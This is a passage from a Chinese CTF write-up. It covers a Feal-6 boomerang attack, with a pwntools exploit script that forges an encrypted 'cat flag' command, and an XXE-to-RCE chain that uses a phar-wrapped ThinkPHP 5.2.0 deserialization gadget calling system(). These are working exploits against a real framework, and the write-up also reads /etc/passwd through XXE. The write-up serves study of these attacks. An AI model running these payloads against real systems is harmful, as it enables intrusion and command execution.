16`被`Feal6`加密后的密文`c1`；
再 **第二次** 发送`b'\x00' * 32 + (c1 ^ m)`，得到的`c2`即为`Feal6.encrypt(m)`。
解密与此类似。
**第一次** 先发过去`b'\x00' * 32`经过`decrypt`函数，得到`c1 = b'\x00' *
16`被`Feal6`解密后的明文`p1`；
再 **第二次** 发送`b'\x00' * 32 + (p1 ^ c)`，得到的`p2`即为`Feal6.encrypt(c)`。
仔细观察上面两图即可验证，在此不深入证明。
    def encrypt(plain):
        r.sendline('/enc ' + '0'*32)
        c1 = int(r.recvline().strip()[16:32], 16)
        r.sendline('/enc ' + '0'*32 + hex(c1 ^ plain)[2:].zfill(16) )
        c2 = int(r.recvline().strip()[32:48], 16)
        return c2
    def decrypt(cipher):
        r.sendline('/dec ' + '0'*32)
        p1 = int(r.recvline().strip()[16:32], 16)
        x = p1 ^ cipher
        r.sendline('/dec ' + '0'*32 + hex(x)[2:].zfill(16))
        p2 = int(r.recvline().strip()[32:48], 16)
        return p2
* * *
再来看如何获得flag：
发过去的内容前5个字节只能是`/enc , /dec , /cmd , /exit`，分别对应`encrypt, decrypt, exec,
exit`功能。
  * `/exit`：直接退出。
  * `/enc`：将选项后面的字节传入`encrypt`函数，返回函数结果。
  * `/dec`：将选项后面的字节传入`decrypt`函数，返回函数结果。
  * `/cmd`：将选项后面的 **八字节** 先经过`Feal6`解密，解密后的结果的开头只能是`cat, ls, pwd`这三个命令，并执行。
我们可以通过上面那个获取任意`c = Feal6.encrypt(m)`来获取以上三个命令的密文，并发送过去`/cmd
{Feal6.encrypt(cmd)}`即可执行命令。
`ls, pwd`执行结果均没有问题，问题出在了`cat`无法执行。
百思不得其解。。。
后来在`Feal6.py`文件中发现了问题所在：
woc，原来出题人在这里有限制，无法对含有`cat`的明文进行`Feal6`加密！
> 我就说，不然这题也太水了，跟前面两道不是一个档次。原来出题人在这个地方有限制。。。
我们必须要获得`cat flag`被加密的密文，要绕过那个加密函数来获得密文。
加密模式那边肯定是无法获得这个密文的，那么问题很可能就出现在这个`Feal6`加密算法上！
Google搜到，`Feal`系列算法 **很菜** ，防不住很多攻击，最主要的就是 **差分攻击** (`Differential
Cryptoanalysis`)。
[wiki](https://en.wikipedia.org/wiki/FEAL)里说只要100个明密文对，分分钟破解这个`Feal-6`。
> 当时已经半夜1，2点了，实在肝不动了，以为这一题就是要先获取100个明密文对，然后本地算出subkeys，然后本地加密`cat
> flag`获得密文。但又想了想，服务器连接时间是有限制的，破解subkeys应该还是要点时间的，好像不太可行。。
* * *
后来，看到官方wp说是`Boomerang Attack`，并找了几篇关于`Feal-6`的文章学习了一下。
  * [由Feal-4密码算法浅谈差分攻击](https://www.anquanke.com/post/id/178045#h2-0)
  * [Differential Cryptanalysis of FEAL](http://theamazingking.com/crypto-feal.php)
  * [Boomerang Attack on FEAL-6](http://theamazingking.com/crypto-boom.php)
以及一个关于`Boomerang
Attack`的[youtube视频](https://www.youtube.com/watch?v=z53O4bX_TBw)。
看到这里的时候，我茅塞顿开，原来真的可以绕过！！！
> What a beautiful circuit!
tql！！！
令`P0 = b'cat flag'`，我们要获取`P0`加密后的密文。
我们可以通过`P0 -> P1 -> C1 -> C3 -> P3 -> P2 -> C2 -> C0`来绕过。
具体内容可以看上面提供的资料。
* * *
exp:
    # python2
    import string 
    from pwn import *
    from itertools import product
    import hashlib
    from Crypto.Util.number import *
    host, port = '', 10000
    r = remote(host, port)
    # context.log_level = 'debug'
    def encrypt(plain):
        r.sendline('/enc ' + '0'*32)
        c1 = int(r.recvline().strip()[16:32], 16)
        r.sendline('/enc ' + '0'*32 + hex(c1 ^ plain)[2:].zfill(16) )
        c2 = int(r.recvline().strip()[32:48], 16)
        return c2
    def decrypt(cipher):
        r.sendline('/dec ' + '0'*32)
        p1 = int(r.recvline().strip()[16:32], 16)
        x = p1 ^ cipher
        r.sendline('/dec ' + '0'*32 + hex(x)[2:].zfill(16))
        p2 = int(r.recvline().strip()[32:48], 16)
        return p2
    # PoW
    rcv = r.recvline().strip()
    suffix = rcv.split('+')[1].split(')')[0]
    dig = rcv.split('==')[1].strip()
    for prefix in product(string.ascii_letters+string.digits, repeat=4):
        guess = ''.join(prefix)
        if hashlib.sha256(guess + suffix).hexdigest() == dig:
            break
    r.sendline(guess)
    r.recvuntil("Let's boom!!!\n")
    r.recvuntil('\n')
    # construct payload
    cat = 7161132565001953639    # b'cat flag'
    delta = 0x0200000282808082
    p0 = cat
    p1 = cat ^ delta
    c1 = encrypt(p1)
    c3 = c1 ^ delta
    p3 = decrypt(c3)
    p2 = p3 ^ delta
    c2 = encrypt(p2)
    c0 = c2 ^ delta
    r.sendline('/cmd ' + hex(c0)[2:].zfill(16))
    r.interactive()
比赛结束后环境没了，只能本地测试，结果如下：
## web
### Ticket_System
首先postXML页面存在有XXE漏洞，定义名为XXE的外部实体并尝试使用file协议将etc/passwd文件的内容取出，赋值给了实体，成功读取靶机/etc/passwd的内容
XXE漏洞存在，读取根目录下的hints.txt得知需要实现rce，此时联想到除了file协议XXE同样能执行phar协议，并且从报错页面得知thinkphp的版本为5.2.0，利用thinkphp的反序列化链即可实现rce。
首先创建phar.php，文件内容如下
    files = array($files);
            }
        }
    }
    namespace think\model\concern {
        trait Conversion
        {
            protected $append = array("Smi1e" => "1");
        }
        trait Attribute
        {
            private $data;
            private $withAttr = array("Smi1e" => "system");
            public function get($system)
            {
                $this->data = array("Smi1e" => "$system");
            }
        }
    }
    namespace think {
        abstract class Model
        {
            use model\concern\Attribute;
            use model\concern\Conversion;
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model
        {
            public function __construct($system)
            {
                $this->get($system);
            }
        }
    }
    namespace {
        $Conver = new think\model\Pivot("ls");
        $payload = new think\process\pipes\Windows($Conver);
        @unlink("phar.phar");
        $phar = new Phar("phar.phar"); //后缀名必须为phar
        $phar->startBuffering();
        $phar->setStub("GIF89a"); //设置stub
        $phar->setMetadata($payload); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
        echo urlencode(serialize($payload));
    }
    ?>
生成phar.phar文件后将后缀修改为xml后上传文件(文件上传功能只允许我们上传xml文件到tmp目录下)，文件成功上传后得到绝对路径，此时再到postXML页面将执行语句修改为phar:///tmp/uploads/生成的文件名.xml，即可实现phar文件的反序列化从而执行任意命令  
读取到根目录中存在有readflag程序，尝试调用，修改执行语句为./readflag
是*ctf的一道原题，上传perl脚本后执行得到flag